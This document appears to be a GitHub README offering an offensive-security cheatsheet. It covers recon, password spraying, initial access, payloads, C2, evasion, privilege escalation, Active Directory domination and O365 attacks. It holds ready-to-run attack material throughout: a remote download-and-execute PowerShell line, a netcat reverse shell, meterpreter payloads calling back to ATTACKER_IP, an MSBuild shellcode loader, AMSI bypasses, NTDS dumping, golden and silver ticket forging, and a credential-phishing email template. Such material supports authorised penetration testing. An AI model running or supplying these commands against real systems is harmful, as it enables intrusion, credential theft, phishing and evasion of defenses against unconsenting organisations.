# Toolbox
Offensive Security Toolbox + Cheatsheet

#### Windows Attacker Tooling Setup Script
``` powershell
Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/cdnet01/Toolbox/refs/heads/main/setup.ps1'))
```
^ this script is useful for setting up new windows attacker machines

## Recon and Scanning

<details>
<summary> anymailfilder.com </summary>

useful for finding company email naming convention. 
</details>

<details>
<summary> gathercontacts </summary>

burpsuite extention that scrapes names from linkedin. requires manually searching for: 

`site:linkedin.com/in "company name"`
</details>

<details>
<summary> dnsrecon </summary>

``` bash
# enumerate dns records for a range, specifying the dns server.
dnsrecon -d domain.tld -n 8.8.8.8
```
</details>

<details>
<summary> knock.py </summary>

``` bash
# brute force subdomains, specifying a dns server
knockpy -d domain.com --bruteforce --dns 8.8.8.8

# conduct "recon" against a domain and save results
knockpy -d domain.com --recon --save foldername
```
</details>

<details>
<summary> sublist3r </summary>

``` bash
# brute force subdomains
sublist3r -d domain.com
```
</details>

<details>
<summary> ffuf </summary>

``` bash
# brute force subdomains via host header, filtering out 404 responses.
ffuf -w subdomains.txt -u http://domain.com/ -H "Host: FUZZ.domain.com" -fc 404
```
</details>

<details>
<summary> masscan </summary>

``` bash
# scan entire /8 range on all ports. set rate to a fast but "safe" limit and output as binary (saves space)
masscan -p 0-65535 --rate 15000 10.0.0.0/8 -oB filename.bin

# convert binary output into a greppable format
masscan --open --readscan filename.bin -oG filename.gnmap

# from here, you can grep for live hosts, open ports, and more.
grep /open/ filename.gnmap | cut -d ' ' -f 2 | sort -uV > livehosts.txt
```
</details>

<details>
<summary> nmap </summary>

``` bash
# without using host discovery, SYN connect scan on range and only output open ports.
sudo nmap -Pn -sT --open 10.140.21.1-255

# full service scan on a /24 range. output in all formats (grep-able, xml, binary)
sudo nmap -sV 10.10.20.0/24 -oA filename

# view all NSE scripts
ls /usr/share/nmap/scripts/*.nse

# run smb discovery
sudo nmap -Pn -p445 --open --script=smb-os-discovery.nse 10.140.13.27

# privide a file containing rfc1918 rangesm, then DNS reverse lookup and output into grep-able file
namp -iL rfc1918.txt -sL --dns-servers 10.10.14.98 -oG
```
</details>

<details>
<summary> eyewitness </summary>

``` bash
# feed an xml list of hosts to be scanned for webpages
EyeWitness.py --web -x filename.xml

# feed a newline separated list of domains 
eyewitness --web -f domains.txt --threads 10
```
</details>

## Password Attacks
<details>
<summary> hydra </summary>

``` bash
# trim word list with hydra's pw-inspector. min password length set to 8, at least 3 critera must be met, and set criteria to (l) lowercase, (u) uppercase, (n) numbers, (p) printable chars, (s) special chars.
pw-inspector -i breachdata.txt -o trimmed.txt -m 8 -c 3 -lunps

# password spray SMB on many hosts using username file
hydra -L users.txt -p 'p@ssw0rd' -M windows-hosts.txt smb2

# password spray a domain controller
hydra -L users.txt -p Summer2025! -m workgroup:{name} 10.140.10.2 smb2

# check valid creds against a list of hosts
hydra -m workgroup:{company} -l username -p password -M smbservers.txt smb2

# attack ssh
hydra -L users.txt -P passwords.txt ssh://102.168.1.38
```
</details>

<details>
<summary> ffuf </summary>

``` bash
# find usernames matching on a response containing "username already exists"
ffuf -w users.txt -X POST -d "username=FUZZ&password=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://domain.com/login -mr "username already exists"

# brute force web login creds
ffuf -w users.txt:W1,passwords.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://domain.com/login -fc 200
```
</details>

<details>
<summary> netexec </summary>

``` powershell
# use netexec to enumerate password and user list against a desired service (in this case, smb)
nxe.exe -u "C:\usernames.txt" -p "C:\passwords.txt" -d domain.com --continue-on-success --no-bruteforce 10.20.13.4
```
</details>

<details>
<summary> hashcat </summary>

``` bash
# crack kerberos TGS-REP hash (output from GetUserSPNs.py) and append 4 digits to the passwords 
hashcat -m 13100 -a 6 hashfile.txt passwordlist.txt ?d?d?d?d
```
</details>

## Initial Access
<details>
<summary> impacket </summary>

```bash 
# connect to mssql server and specify the domain controller ip
mssqlclient.py domain.com/username:password@10.13.12.3 -dc-ip 10.10.192.10

# connect to smb server
smbclient.py domain.com/username:password@10.13.12.3

# execute code using the psexec service 
psexec.py domain.com/username:password@10.13.12.3 -dc-ip 10.10.192.10

# execute code using the smb service
smbexec.py domain.com/username:password@10.13.12.3 -dc-ip 10.10.192.10

# execute code using wmic
wmiexec.py domain.com/username:password@10.13.12.3 -dc-ip 10.10.192.10
```
</details>

<details>
<summary> netexec </summary>

``` powershell
# use netexec to enumerate rids
nxe.exe smb 10.140.13.3 -u username -p 'password' --rid-brute

# list shares
netexec smb 10.140.13.3 -u username -p 'password' --shares
```
</details>

<details>
<summary> evilwinrm </summary>

``` bash 
evil-winrm -i 10.13.10.3 -u "username" -p "password"
```

</details>


<details>
<summary> xfreerdp </summary>

``` bash
# rdp into a server ignoring any self signed certs
xfreerdp /u:username /p:password /v:10.230.21.12 /cert:ignore /dynamic-resolution
```
</details>

<details>
<summary> netcat </summary>

``` bash
# open listener for reverse shell on attacker machine
nc -lvp 4444

# shovel the shell from the target to the attacker
nc 192.168.1.31 4444 -e /bin/bash
```
</details>

## Payloads
common payload types: 

1. office macros
2. office auto DDE (default on excel and outlook)
3. ISO images 
4. zip files (often encrypted)
5. lnk files with rundll32

<details>
<summary> msfvenom </summary>

``` bash 
# view payload formats
msfvenom --list formats

# generate malicious installer file
msfvenom -p windows/meterpreter/reverse_http lhost=ATTACKER_IP lport=8976 -f msi -o setup.msi
```
</details>

<details>
<summary> genisoimage </summary>

``` bash
# place payload inside of an iso container
genisoimage -o installer.iso setup.msi
```
</details>

## Command & Control
<details>
<summary> metasploit </summary>

``` bash
# setup multi handler
use exploit/multi/handler

# set payload 
set PAYLOAD windows/meterpreter/reverse_http

# view config
show options

# allow listener to receive multiple connections without having to restart it
set ExitOnSession false

# meterpreter commands
sysinfo
getuid
ps
# migrate to a new process
migrate -N explorer.exe
# start keylogger
keyscan_start
keyscan_dump
# file control
upload local_filename
download remote_filename
edit remote_filename
```
</details>

<details>
<summary> sliver </summary>

``` bash
# setup an https listener
https 

# generate an exe payload to only run for a specified username
generate --os windows --name filename --limit-username user1 --http LISTENING_ADDR

# generate a dll payload (run dll payload on victim with: regsvr32 filename.dll)
generate --os windows --arch 64bit --format shared --http https://ATTACKER_IP

# view payload 
impants

# view sessions
sessions

# use a session (use first few letters of session id)
use 1b
```
</details>

## Evasion 
<details>
<summary> msbuild.exe </summary>

``` powershell
# if msbuild is enabled, it can be used to execute arbitrary shellcode. first, lets find msbuild
ls C:\Windows msbuild.exe -Recurse 2>$null | % FullName

# if found, chose either a 32 bit or 64 bit version. whatever version is chosen, shellcode needs to match. Once you have created your xml build.xml file, you can run it
C:\Windows\Microsoft.NET\assembly\GAC_32\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe C:\build.xml
```
generate shellcode
``` bash
# generate an msfvenom payload in csharp. this will output a byte format compatible with c#
msfvenom -p windows/meterpreter/reverse_tcp lhost=eth0 lport=9871 -f csharp | tee /tmp/payload.txt

# add the output of msfvenom to the below build.xml file where it says "// PUT SHELLCODE HERE"

# setup your listener 
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LPORT 9871
```

build.xml
``` xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Hello">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
 
      <Code Type="Class" Language="cs">
      <![CDATA[
        using System;
        using System.Runtime.InteropServices;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class ClassExample :  Task, ITask
        {         
          private static UInt32 MEM_COMMIT = 0x1000;          
          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
          [DllImport("kernel32")]
            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
          [DllImport("kernel32")]
            private static extern IntPtr CreateThread(            
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            UInt32 lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId           
            );
          [DllImport("kernel32")]
            private static extern UInt32 WaitForSingleObject(           
            IntPtr hHandle,
            UInt32 dwMilliseconds
            );          
          public override bool Execute()
          {
            // PUT SHELLCODE HERE
 
            UInt32 funcAddr = VirtualAlloc(0, (UInt32)buf.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(buf, 0, (IntPtr)(funcAddr), buf.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            IntPtr pinfo = IntPtr.Zero;
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return true;
          } 
        }     
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```
</details>

<details>
<summary> AMSI Bypassing </summary>

``` powershell
# AMSI (antimalware scan interface) was addedd in powershell version 3, previous version wont have it. For example, the following command (run from cmd) wont trigger AMSI
powershell -version 2 -command " 'amsiutils' " 

# String modification will also work to bypass amsi. For example, the following powershell command wont trigger signatures
"Invoke"+"-Mimikatz"
```
</details>

<details>
<summary> Comment Stripping </summary>

``` powershell
# by removing comments, some AV/EDR may fail to signature certain things
PowerStripper.exe bad_script.ps1
```
</details>

<details>
<summary> Testing Windows Defender </summary>

``` powershell
# making modifications to a payload until it no longer triggers windows defender is another option. This tool will show the exact byte that triggered defender 
DefenderCheck.exe payload.exe
```
</details>


## Situational Awareness
<details>
<summary> linux </summary>

``` bash
cat /etc/passwd
sudo -l
# recursively search for a case insensitive filename from root directory
find / -type f -iname *.db
# recuresiveley search files for secrets from root directory
grep -Inri -e passw -e secret -e key / 2>/dev/null
# find SUID files
find / -perm -4000 -ls 2>/dev/null
# find writable config files
find /etc -perm 2
# find readable bash histories 
find /home -name .bash_history -perm 4 2>/dev/null
# find writable authorized hosts files
find /home -name authorized_hosts -perm 2 2>dev/null
```
</details>

<details>
<summary> windows </summary>

``` bat
ipconfig /displaydns
net users
net user username
net localgroup
net localgroup administrators
net user user_name /domain
rem firewall settings
netsh firewall show state
netsh firewall show config
rem show scheduled tasks
schtasks /query /fo LIST /v
rem show patch level 
wmic qfe get Caption,Description,HotFixID,InstalledOn
rem list all domain users
net user /domain
rem add a user
net user logon_name password /add
rem add user to local admins
net localgroup administrators logon_name /add
rem list all domain admins
net group "Domain Admins" /domain
rem find file recursively
dir /s *name*
rem find secrets recursiveley
dir /s *pass* == *cred* == *vnc* == *.config*

rem use sysinternals adexplorer to fetch active directory information
ADExplorer.exe 
```
</details>

<details>
<summary> impacket </summary>

``` bash
# extract list of all users
GetADUsers.py domain.com/username:password -dc-ip 10.140.10.2 -all

# enumerate user SPNs on a remote machine
GetUserSPNs.py domain.com/username:password -request -dc-ip 10.120.2.59
```
</details>

<details>
<summary> seatbelt.exe </summary>

``` powershell 
# get info on AV
seatbelt.exe AntiVirus

# get info on installations
seatbelt.exe InstalledProducts

# get system info
seatbelt.exe -q -group=system

# show commands that can be run against remote computers
seatbelt.exe -q | findstr +

# launch a module against a remote computer
seatbelt.exe UAC 'computername=10.140.12.13' -username=company\user -password=password
```
</details>

<details>
<summary> bloodhound </summary>

``` bash
# using python tooling, remotely retreive AD information for loading into bloodhound
bloodhound-python -d domain.com -u username -p password -c ALL -ns 10.10.192.2

# using c# tooling, retreive AD infomation for loading into bloodhound
sharphound.exe

# start bloodhound application
./BloodHound
```
</details>

## Lateral Movement
<details>
<summary> windows - living off the land </summary>

``` bat
rem using ping, scan a network range for live hosts (from 1-254)
for /l %i in (1,1,254) do @ping 192.168.1.%i -w 10 -n 1 | find "Reply"

rem powershell one-liner to scan a host for open ports
80,443,22,445,3389 | % { echo ((New-Object Net.Sockets.TcpClient).Connect("10.14.23.10",$_)) "$_" } 2>out-null

rem enable clientside WinRM components (enabled by default on windows serverside, but not on clients)
Enable-PSRemoting

rem enable CredSSP
winrm set winrm/config/client/auth '@{CredSSP ="true"}'

rem trust any host
winrm set winrm/config/client/auth '@{TrustedHosts ="*"}'
```
</details>

<details>
<summary> responder </summary>

``` bash
# assuming the attacker is on the same network as the target, Responder can resolve any LLMNR requests and capture NTLMv2 hashes.
sudo Responder.py -I eth0

# once running, once the victim attempts to connect to a system (via SMB)that does not exist, responder will posion the resolution of the host, and capture the hash. 

# once the hash is obtained, the hash can be cracked with hashcat
hashcat -m 5600 /tools/responder/logs/* /usr/share/rockyou.txt
```
</details>

## Persistence
- create a new user/password
- add attacker ssh public key to authorized_keys file
- create a scheduled task
- create a WMI event consumer


## Privelege Escalation
<details>
<summary> linux </summary>

1. [gtfobins](https://gtfobins.github.io/)
2. [linpeas](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
3. cheatsheets. [here is a good one](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

</details>

<details>
<summary> windows </summary>

1. [LOLBAS](https://lolbas-project.github.io/#)
2. Unquoted Service Paths
3. [winpeas](https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md)
4. preferences policy file. msft publishes the [AES key](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be)
5. always install elevated registry setting
``` bat
rem This will only work if both registry keys contain "AlwaysInstallElevated" with DWORD values of 1.
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```
5. unattended install files
``` powershell
# unattended install files typically in these locations
c:\sysprep.inf
c:\sysprep\sysprep.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml
```
</details>

## Domination
<details>
<summary> golden ticket </summary>

target machine (domain controller):
``` bat
rem as administrator on a domain controller, list shadow copies
vssadmin.exe list

rem if no existing copies, create one. 
vssadmin.exe create shadow /for=c:

rem copy the ntds.dit file from the shadoy copy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit c:\temp\ntds.dit

rem in order to extract hashes from ntds.dit you need the encryption key from the system hive. save the key from the registry:
reg save hklm\system c:\temp\system /y
```
attacker machine:
``` bash
# now, extract the ntds.dit and system files from the dc (use smbclient.py or whatever works). Once obtained, on the attacker machine, dump hashes
secretsdump.py -ntds ~/ntds.dit -system ~/system -outputfile hashes.txt LOCAL

# alternatively, you could do all of the above remotely using secretsdump.py. specifically here, were looking for the krbtgt hash
secretsdump.py domain.com/username:'password'@10.20.10.10 -just-dc-user krbtgt

# --------- with the above hashes, we can conduct the following golden ticket attack --------- #

# get the SID for the domain (stop lookup after enumerating to 520)
lookupsid.py domain.com/username:'password'@10.20.10.10 520

# armed with the domain SID and the krbtgt AES key, we can create a golen ticket
ticketer.py -domain domain.com -domain-sid S-1-5-21-XXXXXXXXX-YYYYYYYYY -aesKey AES_KEY_HERE Administrator

# export the ticket to later be used by impacket 
export KRB5CCNAME=Administrator.ccache

# use the ticket with impacket against a fileserver on the domain and run a command remotely
wmiexec.py -k -no-pass -dc-ip 10.20.10.10 file01.domain.com hostname
```
</details>

<details>
<summary> silver ticket </summary>

``` bat
rem like above, obtain the domain SID
lookupsid.py domain.com/username:'password'@10.20.10.10 520

rem in this case, we want to obtain the aes256 hash for a computer account (in this case file01$)
secretsdump.py domain.com/username:password@10.20.10.10 -just-dc-user file01$

rem using rubeus (could also use ticketer) generate the ticket for the SMB service on the fileserver
Rubeus.exe sliver /service:cifs/file01.domain.com /aes256:HASH_G0ES_HERE /sid:S-1-5-21-XXXXXXX-YYYYYYYY-ZZZZZZZ /ptt /user:username

rem ensure the kerberos ticket has been loaded into local memory 
klist

rem now, try to hit access the server
dir \\file01.domain.com\c$

rem in this example, we can instead forge a ticket for a different "serviceclass" (we did cifs before) that lets us query the target's event logs using an arbitrary username and user id
Rubeus.exe sliver /service:host/file01.domain.com /aes256:HASH_G0ES_HERE /sid:S-1-5-21-XXXXXXX-YYYYYYYY-ZZZZZZZ /ptt /user:anything /id:777

rem now query the event logs
wevutil /r:file01.domain.com qe Security "/q:*[System/EventID=4624] and *[EventData/Data[@Name='TargetUserName'='anything']" /f:text /c:1

```

</details>

## Microsoft O365
<details>
<summary> AADInternals </summary>

``` powershell
# conduct azure recon on given domain name
Invoke-AADIntReconAsOutsider -DomainName domain.com | Format-Table

# pass list of users to verify valid usernames
Get-Content .\users.txt | Invoke-AADIntUserEnumerationAsOutsider -Method Normal

# Send a phishing email to recipients using customised message and save the tokens to cache
$message = 'Dear recipient, <br> Your Microsoft account has been compromised. Login at <a href="{1}">https://microsoft.com</a> to reset your password. <br> Use the following security code: <b>{0}</b>.' 
Invoke-AADIntPhishing -Recipients "wvictim@domain.com","wvictim2@domain.com" -Subject "Your Microsoft account is compromised - Actions required." -Sender "Johnny Carson <jc@somewhere.com>" -SMTPServer smtp.myserver.local -Message $message -SaveToCache

# open a user's mailbox using the tokens you just obtained from previous phishing
Open-AADIntOWA
```
</details>

<details>
<summary> Password Spraying Azure </summary>

``` bash
# use trevorspray to get the token endpoint
trevorspray --recon domain.com

# spray passwords against known users
trevorspray --users /tmp/users.txt --passwords /tmp/passwords.txt --url 'https://login.windows.net/TENANT-ID/oauth2/token'

```
</details>

<details>
<summary> GraphRunner </summary>

``` powershell
# obtain a devicelogin token to use in a phishing email
Get-GraphTokens

# check security groups using the auth tokens obtained from prior phishing attack
Get-SecurityGroups -Tokens $tokens

# identify dynamic security groups to possibly use for privelege escalation
Get-DynamicGroups -Tokens $tokens
```
</details>